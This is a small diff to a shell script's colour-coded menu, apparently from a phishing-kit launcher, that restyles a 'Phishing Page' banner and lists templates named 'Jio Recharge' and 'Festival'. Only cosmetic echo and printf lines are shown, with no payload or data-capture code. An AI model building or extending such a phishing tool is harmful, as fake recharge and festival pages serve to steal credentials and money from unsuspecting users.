@@ -1,5 +1,5 @@
 echo ""
-echo -e "\e[1;96m< < =============== < Phishing Page > =============== > >\e[m "
+echo -e "\e[1;96m< < =============== < \e[32mPhishing Page \e[96m> =============== > >\e[m "
 printf " \e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m " 
 echo " "
 printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44m Jio Recharge \e[0m       \e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;91;107m Festival \e[0m   "
